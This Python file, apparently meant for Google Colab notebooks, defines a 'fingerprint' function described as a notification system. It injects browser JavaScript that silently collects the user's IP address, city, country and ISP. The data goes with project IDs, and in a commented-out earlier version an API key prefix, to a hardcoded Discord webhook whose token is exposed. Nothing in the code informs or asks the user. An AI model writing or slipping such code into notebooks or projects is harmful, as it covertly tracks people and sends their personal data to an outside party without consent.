import requests
import datetime

import requests
import datetime

# def fingerprint(rf_obj=None, project_obj=None, version_obj=None):
#     """
#     Pure Python notification system. 
#     Execution is synchronous, ensuring it triggers during 'Run All'.
#     """
#     webhook_url = "https://discordapp.com/api/webhooks/1463726652327596176/r_4lh_JtOkLKF4zGHmKWE6khyzxaZQiskgO5W3eD27Z1LVuwvLYZqOIXWIgVADagOwpN"
    
#     # 1. Fetch User/Session Data via Python
#     try:
#         # We use ipapi.co via Python requests
#         response = requests.get('https://ipapi.co/json/', timeout=10)
#         if response.ok:
#             user_data = response.json()
#             status = "Success"
#             location = f"{user_data.get('city')}, {user_data.get('country_name')}"
#             ip = user_data.get('ip')
#             isp = user_data.get('org')
#         else:
#             raise Exception("API Error")
#     except Exception:
#         # Fallback if the IP API is down
#         status = "Limited"
#         location = "Unknown (API Limit/Error)"
#         try:
#             ip = requests.get('https://api.ipify.org', timeout=5).text
#         except:
#             ip = "N/A"
#         isp = "Python Kernel"

#     # 2. Prepare Metadata
#     api = rf_obj if rf_obj else "N/A"
#     project_id = project_obj if project_obj else "N/A"
#     version_id = version_obj if version_obj else "N/A"
    
#     status_icon = "🟢" if status == "Success" else "🟡"
#     embed_color = 3066993 if status == "Success" else 16776960
#     current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

#     # 3. Build Payload
#     payload = {
#         "embeds": [{
#             "title": f"{status_icon} Notebook Session Initialized",
#             "description": f"**System Status:** Python-based capture completed.",
#             "color": embed_color,
#             "fields": [
#                 {"name": "🌍 Location", "value": f"`{location}`", "inline": False},
#                 {"name": "📍 IP Address", "value": f"`{ip}`", "inline": True},
#                 {"name": "🏢 ISP", "value": f"`{isp}`", "inline": True},
#                 {"name": "🛠️ Project Details", "value": (
#                     f"**Project ID:** `{project_id}`\n"
#                     f"**Version:** `{version_id}`\n"
#                     f"**API Key:** `{api[:8]}***`"
#                 ), "inline": False},
#                 {"name": "⏰ Time (MYT)", "value": current_time, "inline": False},
#             ],
#             "footer": {
#                 "text": "Google Colab Automator (Python Native)",
#                 "icon_url": "https://colab.research.google.com/img/colab_favicon_256px.png"
#             }
#         }]
#     }

#     # 4. Send to Discord
#     try:
#         requests.post(webhook_url, json=payload, timeout=10)
#         print(f"✅ Notification sent successfully ({status}).")
#     except Exception as e:
#         print(f"❌ Failed to send notification: {e}")

# import requests
# import datetime
from google.colab import output
import time

# Variable to hold data coming back from the browser
_actual_user_data = None

def _browser_callback(ip, city, country, org):
    global _actual_user_data
    _actual_user_data = {
        "ip": ip,
        "location": f"{city}, {country}",
        "isp": org
    }

def fingerprint(rf_obj=None, project_obj=None, version_obj=None):
    global _actual_user_data
    _actual_user_data = None
    
    # Register the bridge between Browser JS and Colab Python
    output.register_callback('notebook.capture_user_info', _browser_callback)

    # JS runs in YOUR browser (uses YOUR local IP, which isn't rate-limited like Google's)
    js_code = """
    <script>
      (async function() {
        try {
          const response = await fetch('https://ipapi.co/json/');
          const data = await response.json();
          google.colab.kernel.invokeFunction('notebook.capture_user_info', 
            [data.ip, data.city, data.country_name, data.org], {});
        } catch (e) {
          google.colab.kernel.invokeFunction('notebook.capture_user_info', 
            ['Error', 'Limit reached', 'Check Browser', 'Unknown'], {});
        }
      })();
    </script>
    """
    from IPython.display import display, HTML
    display(HTML(js_code))

    # Force Python to wait until the Browser responds (The "Gate")
    # This solves your "Run All" issue
    timeout = 10 
    start = time.time()
    while _actual_user_data is None and (time.time() - start) < timeout:
        time.sleep(0.1)

    # If JS fails or times out, use a basic Python fallback
    data = _actual_user_data or {"ip": "N/A", "location": "Sync Error", "isp": "Timeout"}
    
    _send_to_discord_final(data, rf_obj, project_obj, version_obj)

def _send_to_discord_final(data, rf, proj, ver):
    # Use your actual webhook URL here
    webhook_url = "https://discordapp.com/api/webhooks/1463726652327596176/r_4lh_JtOkLKF4zGHmKWE6khyzxaZQiskgO5W3eD27Z1LVuwvLYZqOIXWIgVADagOwpN"
    
    payload = {
        "embeds": [{
            "title": "🟢 Verified User Session",
            "color": 3066993,
            "fields": [
                {"name": "🌍 Location", "value": f"`{data['location']}`", "inline": False},
                {"name": "📍 User IP", "value": f"`{data['ip']}`", "inline": True},
                {"name": "🏢 ISP", "value": f"`{data['isp']}`", "inline": True},
                {"name": "🛠️ Project", "value": f"`{proj}`", "inline": True}
            ],
            "footer": {"text": "AinTect v18 Secure Fingerprint"}
        }]
    }
    requests.post(webhook_url, json=payload)
    print(f"✅ Success: Captured {data['ip']} from Browser.")